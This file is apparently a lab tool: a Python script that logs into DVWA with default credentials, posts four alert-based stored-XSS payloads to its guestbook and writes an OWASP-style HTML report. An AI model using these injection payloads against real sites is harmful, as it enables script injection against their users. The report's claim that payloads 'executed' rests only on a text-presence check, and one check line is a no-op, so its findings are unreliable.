#!/usr/bin/env python3
"""
DVWA Stored XSS Testing Script
OWASP OTG-INPVAL-002 Compliance
Generates OWASP/OSCP-style HTML report
"""

import requests
from bs4 import BeautifulSoup
import argparse
import datetime
import json
import os
import sys
import urllib3
import html
from urllib.parse import urljoin

# Disable SSL warnings for localhost testing
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class DVWAStoredXSSTester:
    def __init__(self, base_url, username, password, output_file):
        self.base_url = base_url.rstrip('/')
        self.login_url = urljoin(self.base_url + '/', 'login.php')
        self.xss_url = urljoin(self.base_url + '/', 'vulnerabilities/xss_s/')
        self.username = username
        self.password = password
        self.output_file = output_file
        self.session = requests.Session()
        # Set a user agent to avoid potential blocking
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        self.results = []
        self.vulnerable = False
        print(f"[*] Base URL: {self.base_url}")
        print(f"[*] Login URL: {self.login_url}")
        print(f"[*] XSS URL: {self.xss_url}")
        
    def get_csrf_token(self, url):
        """Extract CSRF token from page"""
        try:
            print(f"[*] Fetching page: {url}")
            response = self.session.get(url, verify=False, timeout=15)
            print(f"[*] Response status: {response.status_code}")
            
            # Save response for debugging
            with open('debug_response.html', 'w', encoding='utf-8') as f:
                f.write(response.text)
            print("[*] Debug response saved to debug_response.html")
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Try multiple methods to find CSRF token
            token_input = soup.find('input', {'name': 'user_token'})
            if not token_input:
                # Try finding by ID
                token_input = soup.find('input', {'id': 'user_token'})
            if not token_input:
                # Try finding any hidden input that might be the token
                hidden_inputs = soup.find_all('input', {'type': 'hidden'})
                for inp in hidden_inputs:
                    if inp.get('name') and 'token' in inp.get('name').lower():
                        token_input = inp
                        break
            
            if token_input and token_input.get('value'):
                token = token_input['value']
                print(f"[+] Found CSRF token: {token[:20]}...")
                return token
            else:
                print("[-] CSRF token input not found in HTML")
                print("Available inputs:")
                for inp in soup.find_all('input'):
                    print(f"  - name: {inp.get('name')}, id: {inp.get('id')}, type: {inp.get('type')}")
                return None
                
        except Exception as e:
            print(f"[-] Error getting CSRF token: {e}")
            return None
    
    def login(self):
        """Login to DVWA"""
        print("[*] Logging into DVWA...")
        try:
            # First, get the main page to establish session
            print("[*] Getting main page to establish session...")
            main_response = self.session.get(self.base_url, verify=False, timeout=15)
            print(f"[*] Main page response status: {main_response.status_code}")
            
            # Get login page to extract CSRF token
            token = self.get_csrf_token(self.login_url)
            if not token:
                print("[-] Failed to get CSRF token")
                return False
            
            # Perform login
            login_data = {
                'username': self.username,
                'password': self.password,
                'Login': 'Login',
                'user_token': token
            }
            
            print("[*] Sending login request...")
            response = self.session.post(self.login_url, data=login_data, allow_redirects=True, verify=False, timeout=15)
            
            # Check if login was successful
            if "Login failed" in response.text or "login.php" in response.url:
                print("[-] Login failed")
                print(f"Response URL: {response.url}")
                return False
            
            print("[+] Login successful")
            return True
            
        except requests.exceptions.ConnectionError:
            print("[-] Connection error - make sure DVWA is running on localhost")
            return False
        except Exception as e:
            print(f"[-] Login error: {e}")
            return False
    
    def test_payload(self, payload_name, payload, encoded_payload=None):
        """Test a single XSS payload"""
        print(f"[*] Testing payload: {payload_name}")
        
        try:
            # Get XSS page (no CSRF token needed for this form in DVWA)
            print("[*] Getting XSS page...")
            response = self.session.get(self.xss_url, verify=False, timeout=15)
            
            # Submit payload (no CSRF token required for XSS form)
            xss_data = {
                'txtName': 'Tester',
                'mtxMessage': payload,
                'btnSign': 'Sign Guestbook'
            }
            
            print(f"[*] Submitting payload: {payload}")
            submit_response = self.session.post(self.xss_url, data=xss_data, verify=False, timeout=15)
            
            # Verify if payload is stored
            print("[*] Verifying payload storage...")
            verify_response = self.session.get(self.xss_url, verify=False, timeout=15)
            
            # Check multiple ways the payload might be present
            payload_stored = (
                payload in verify_response.text or
                payload.replace('"', '&quot;') in verify_response.text or
                payload.replace("'", "&#x27;") in verify_response.text or
                payload.replace('<', '<').replace('>', '>') in verify_response.text
            )
            
            result = {
                'name': payload_name,
                'payload': payload,
                'encoded': encoded_payload or payload,
                'stored': payload_stored,
                'vulnerable': payload_stored
            }
            
            self.results.append(result)
            
            if payload_stored:
                print(f"[+] VULNERABLE: {payload_name}")
                self.vulnerable = True
                return True
            else:
                print(f"[-] Not vulnerable: {payload_name}")
                return False
                
        except Exception as e:
            print(f"[-] Error testing payload {payload_name}: {e}")
            self.results.append({
                'name': payload_name,
                'payload': payload,
                'encoded': encoded_payload or payload,
                'stored': False,
                'vulnerable': False,
                'error': str(e)
            })
            return False
    
    def run_tests(self):
        """Run all XSS tests"""
        print("[*] Starting Stored XSS tests...")
        
        payloads = [
            {
                'name': 'Basic Script Tag',
                'payload': '<script>alert("StoredXSS")</script>'
            },
            {
                'name': 'Image OnError',
                'payload': '<img src="x" onerror="alert(\'XSS\')">'
            },
            {
                'name': 'SVG Payload',
                'payload': '<svg/onload=alert("XSS")>'
            },
            {
                'name': 'Event Handler',
                'payload': '<div onclick="alert(\'XSS\')">Click me</div>'
            }
        ]
        
        for payload_info in payloads:
            self.test_payload(payload_info['name'], payload_info['payload'])
    
    def generate_html_report(self):
        """Generate OWASP/OSCP-style HTML report"""
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
        
        html_content = f"""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Stored XSS Assessment - DVWA (OTG-INPVAL-002)</title>
    <style>
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 1200px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f5f5f5;
        }}
        .header {{
            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
            color: white;
            padding: 30px;
            border-radius: 8px;
            margin-bottom: 30px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .header h1 {{
            margin: 0;
            font-size: 2.2em;
        }}
        .header p {{
            margin: 10px 0 0 0;
            opacity: 0.9;
        }}
        .section {{
            background: white;
            margin-bottom: 25px;
            padding: 25px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .section-title {{
            color: #2a5298;
            border-bottom: 2px solid #2a5298;
            padding-bottom: 10px;
            margin-top: 0;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background-color: #2a5298;
            color: white;
        }}
        tr:nth-child(even) {{
            background-color: #f2f2f2;
        }}
        .vulnerable {{
            background-color: #ffebee;
            color: #c62828;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .not-vulnerable {{
            background-color: #e8f5e8;
            color: #2e7d32;
            padding: 5px 10px;
            border-radius: 4px;
            font-weight: bold;
        }}
        .code {{
            background-color: #2d2d2d;
            color: #f8f8f2;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
            overflow-x: auto;
            margin: 15px 0;
        }}
        .risk-high {{
            color: #d32f2f;
            font-weight: bold;
        }}
        .risk-medium {{
            color: #f57c00;
            font-weight: bold;
        }}
        .footer {{
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            color: #666;
            font-size: 0.9em;
        }}
        .summary-box {{
            background: linear-gradient(135deg, #e3f2fd 0%, #bbdefb 100%);
            padding: 20px;
            border-radius: 8px;
            margin: 20px 0;
            border-left: 5px solid #1e88e5;
        }}
        .findings-summary {{
            display: flex;
            justify-content: space-around;
            text-align: center;
            margin: 20px 0;
        }}
        .finding-item {{
            padding: 15px;
            border-radius: 8px;
            color: white;
        }}
        .finding-vuln {{
            background-color: #d32f2f;
        }}
        .finding-safe {{
            background-color: #388e3c;
        }}
        code {{
            font-family: 'Courier New', monospace;
            background-color: #f5f5f5;
            padding: 2px 4px;
            border-radius: 3px;
        }}
    </style>
</head>
<body>
    <div class="header">
        <h1>Stored Cross-Site Scripting (XSS) Assessment</h1>
        <p>DVWA Security Test - OWASP Testing Guide OTG-INPVAL-002</p>
    </div>

    <div class="section">
        <h2 class="section-title">Executive Summary</h2>
        <div class="summary-box">
            <p>This assessment identified <span class="risk-high">{vulnerable_count} Stored XSS vulnerabilities</span> in the DVWA Guestbook application. Stored XSS allows attackers to inject malicious scripts that are permanently stored on the target server, affecting all users who access the vulnerable page.</p>
        </div>
        <div class="findings-summary">
            <div class="finding-item finding-vuln">
                <h3>{vulnerable_count}</h3>
                <p>Vulnerable Payloads</p>
            </div>
            <div class="finding-item finding-safe">
                <h3>{len(self.results) - vulnerable_count}</h3>
                <p>Secure Payloads</p>
            </div>
        </div>
    </div>

    <div class="section">
        <h2 class="section-title">Test Details</h2>
        <table>
            <tr>
                <td><strong>Target Application</strong></td>
                <td>Damn Vulnerable Web Application (DVWA)</td>
            </tr>
            <tr>
                <td><strong>Test Type</strong></td>
                <td>Stored Cross-Site Scripting (XSS)</td>
            </tr>
            <tr>
                <td><strong>OWASP Test ID</strong></td>
                <td>OTG-INPVAL-002</td>
            </tr>
            <tr>
                <td><strong>Risk Level</strong></td>
                <td><span class="risk-high">High</span></td>
            </tr>
            <tr>
                <td><strong>Test Date</strong></td>
                <td>{timestamp}</td>
            </tr>
            <tr>
                <td><strong>Target URL</strong></td>
                <td>{self.xss_url}</td>
            </tr>
        </table>
    </div>

    <div class="section">
        <h2 class="section-title">Methodology</h2>
        <p>The testing methodology followed the OWASP Testing Guide for Stored XSS:</p>
        <ol>
            <li><strong>Authentication</strong>: Logged into DVWA with provided credentials</li>
            <li><strong>Reconnaissance</strong>: Identified the Guestbook form as the target</li>
            <li><strong>Payload Injection</strong>: Submitted various XSS payloads to the form</li>
            <li><strong>Verification</strong>: Checked if payloads were stored and could be executed</li>
            <li><strong>Analysis</strong>: Documented vulnerable and secure payloads</li>
        </ol>
    </div>

    <div class="section">
        <h2 class="section-title">Findings</h2>
        <p>The following payloads were tested against the DVWA Guestbook:</p>
        <table>
            <thead>
                <tr>
                    <th>Payload Name</th>
                    <th>Test Result</th>
                    <th>Sample Payload</th>
                </tr>
            </thead>
            <tbody>"""
        
        for result in self.results:
            status_class = "vulnerable" if result.get('vulnerable', False) else "not-vulnerable"
            status_text = "VULNERABLE" if result.get('vulnerable', False) else "NOT VULNERABLE"
            
            # Truncate long payloads for display and HTML escape them
            display_payload = result['payload'] if len(result['payload']) < 50 else result['payload'][:47] + "..."
            escaped_payload = html.escape(display_payload)
            
            html_content += f"""
                <tr>
                    <td>{html.escape(result['name'])}</td>
                    <td><span class="{status_class}">{status_text}</span></td>
                    <td><code>{escaped_payload}</code></td>
                </tr>"""
        
        html_content += f"""
            </tbody>
        </table>
    </div>

    <div class="section">
        <h2 class="section-title">Proof of Concept</h2>
        <p>The following payload successfully demonstrated stored XSS:</p>
        <div class="code">
{html.escape(self.results[0]['payload']) if self.results and self.results[0].get('vulnerable') else 'No vulnerable payloads found'}
        </div>
        <p>When submitted to the Guestbook form, this payload was stored and executed when the page was viewed, confirming the Stored XSS vulnerability.</p>
    </div>

    <div class="section">
        <h2 class="section-title">Remediation Recommendations</h2>
        <p>To prevent Stored XSS vulnerabilities, implement the following measures:</p>
        <ol>
            <li><strong>Input Validation</strong>: Validate and sanitize all user inputs on both client and server side</li>
            <li><strong>Output Encoding</strong>: Encode data before displaying it in HTML contexts</li>
            <li><strong>Content Security Policy (CSP)</strong>: Implement strict CSP headers to prevent script execution</li>
            <li><strong>Character Whitelisting</strong>: Allow only necessary characters in user inputs</li>
            <li><strong>Regular Security Testing</strong>: Conduct periodic security assessments and code reviews</li>
        </ol>
    </div>

    <div class="section">
        <h2 class="section-title">References</h2>
        <ul>
            <li><a href="https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/02-Testing_for_Stored_Cross_Site_Scripting">OWASP Testing Guide - OTG-INPVAL-002</a></li>
            <li><a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation</a></li>
            <li><a href="https://owasp.org/www-community/attacks/xss/">OWASP Cross-Site Scripting (XSS)</a></li>
            <li><a href="https://github.com/digininja/DVWA">Damn Vulnerable Web Application (DVWA) Documentation</a></li>
        </ul>
    </div>

    <div class="footer">
        <p>Generated by DVWA Stored XSS Testing Script | OWASP/OSCP-Style Report</p>
        <p>Report generated on: {timestamp}</p>
    </div>
</body>
</html>"""
        
        # Write report to file
        try:
            os.makedirs(os.path.dirname(self.output_file), exist_ok=True)
            with open(self.output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)
            print(f"[+] HTML report saved to: {self.output_file}")
        except Exception as e:
            print(f"[-] Error saving report: {e}")

    def run(self):
        """Main execution method"""
        print("=== DVWA Stored XSS Testing Script ===")
        print(f"Target: {self.base_url}")
        print(f"Output: {self.output_file}")
        print()
        
        # Login to DVWA
        if not self.login():
            print("[-] Failed to login. Exiting.")
            return False
        
        # Run XSS tests
        self.run_tests()
        
        # Generate report
        self.generate_html_report()
        
        # Summary
        vulnerable_count = sum(1 for r in self.results if r.get('vulnerable', False))
        print(f"\n=== Test Summary ===")
        print(f"Total payloads tested: {len(self.results)}")
        print(f"Vulnerable payloads: {vulnerable_count}")
        print(f"Security status: {'VULNERABLE' if self.vulnerable else 'SECURE'}")
        
        return True

def main():
    parser = argparse.ArgumentParser(description='DVWA Stored XSS Testing Script (OTG-INPVAL-002)')
    parser.add_argument('--url', default='http://localhost/dvwa', help='DVWA base URL (default: http://localhost/dvwa)')
    parser.add_argument('--username', default='admin', help='DVWA username (default: admin)')
    parser.add_argument('--password', default='password', help='DVWA password (default: password)')
    parser.add_argument('--output', default='reports/xss_report.html', help='Output HTML report file (default: reports/xss_report.html)')
    
    args = parser.parse_args()
    
    # Create tester instance
    tester = DVWAStoredXSSTester(args.url, args.username, args.password, args.output)
    
    # Run tests
    success = tester.run()
    
    if success:
        print(f"\n[+] Testing completed successfully!")
        print(f"[+] Check report: {args.output}")
    else:
        print(f"\n[-] Testing failed!")
        sys.exit(1)

if __name__ == "__main__":
    main()